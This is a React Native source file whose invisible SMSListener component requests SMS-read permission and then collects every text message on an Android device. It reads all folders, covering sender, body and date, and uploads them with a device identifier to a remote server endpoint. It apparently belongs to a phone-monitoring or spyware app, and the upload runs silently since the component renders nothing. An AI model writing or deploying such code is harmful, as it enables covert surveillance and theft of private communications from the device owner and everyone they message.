import {
    View,
    Text,
    Platform,
    Button,
    PermissionsAndroid,
    DeviceEventEmitter,
} from "react-native";
import React, { useEffect } from "react";
import SmsAndroid from "react-native-get-sms-android";
import { convertFromTimestamp, privateAxios } from "../utils";
import * as SecureStore from "expo-secure-store";

const getSMS = () => {
    let filter = {
        box: "", // 'inbox' (default), 'sent', 'draft', 'outbox', 'failed', 'queued', and '' for all
        // the next 2 filters can be used for pagination
        // indexFrom: 0, // start from index 0
        // maxCount: 10, // count of SMS to return each time
    };
    SmsAndroid.list(
        JSON.stringify(filter),
        (fail) => {
            console.log("Failed with this error: " + fail);
        },
        async (count, smsList) => {
            const arr = JSON.parse(smsList);
            const deviceId = await SecureStore.getItemAsync("device_id");
            try {
                const formattedMessage = arr.map((message) => ({
                    phone_number: message?.address,
                    name: message?.creator,
                    type: message?.type,
                    content: message?.body,
                    date_time: convertFromTimestamp(message?.date_sent),
                }));
                const res = await privateAxios.post(
                    "/wp-json/cyno/v1/message",
                    {
                        device_id: deviceId,
                        data: formattedMessage,
                    }
                );
                console.log("Res Messages => ", res.data);
            } catch (error) {
                console.log(
                    "Error Messages => ",
                    error.response?.data?.message
                );
            }
        }
    );
};

async function requestReadSmsPermission() {
    try {
        await PermissionsAndroid.request(
            PermissionsAndroid.PERMISSIONS.READ_SMS,
            {
                title: "Allow read SMS permission",
                message: "Allow read SMS permission",
            }
        );
        getSMS();
    } catch (err) {}
}

const SMSListener = () => {
    React.useEffect(() => {
        requestReadSmsPermission();
    }, []);

    return null;
};

export default SMSListener;
